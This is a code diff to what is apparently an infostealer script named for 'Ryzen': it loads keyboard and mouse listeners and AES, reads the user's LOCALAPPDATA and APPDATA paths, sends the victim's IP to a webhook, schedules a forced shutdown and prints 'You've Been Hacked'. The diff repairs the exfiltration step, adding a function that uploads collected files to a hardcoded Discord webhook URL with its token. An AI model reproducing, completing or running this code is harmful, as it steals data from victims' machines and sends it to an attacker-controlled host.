@@ -20,8 +20,6 @@ from pynput import mouse, keyboard as pynput_keyboard
 from Crypto.Cipher import AES
 from pathlib import Path
 
-print("Please Wait 30 seconds")
-
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -327,12 +325,14 @@ def list_applications_in_folders():
 
     return 'applications_list.txt'
 
-def goon():
-    webhook_url = 'https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH'  # Replace with your actual webhook URL
-    list_applications_in_folders(file_path, webhook_url)
+def send_file_to_discord_webhook(file_path, webhook_url):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        response = requests.post(webhook_url, files=files)
+        if response.status_code != 200:
+            print(f"Failed to send file: {response.status_code} {response.text}")
 
 def schedule_shutdown():
-
     current_time = time.localtime()
     shutdown_time = time.strptime(time.strftime('%H:%M', current_time), '%H:%M')
     shutdown_time = time.mktime((current_time.tm_year, current_time.tm_mon, current_time.tm_mday, shutdown_time.tm_hour + 1, shutdown_time.tm_min, 0, 0, 0, 0))
@@ -359,7 +359,7 @@ def send_ip_embed(webhook_url, ip_address):
     if response.status_code != 204:
         print(f"Failed to send IP embed: {response.status_code} {response.text}")
 
-def main():
+def execute_task():
     checked = []
 
     for platform, path in PATHS.items():
@@ -540,10 +540,10 @@ def main():
     send_ip_embed(WEBHOOK_URL, ip_address)
 
 if __name__ == "__main__":
-    main()
+    execute_task()
     schedule_shutdown()
-    goon()
-    send_file_to_discord_webhook(file_path, webhook_url)
+    file_path = list_applications_in_folders()
+    send_file_to_discord_webhook(file_path, 'https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH')
 
 print("[*] You've Been Hacked By Ryzen\n")
 time.sleep(3)
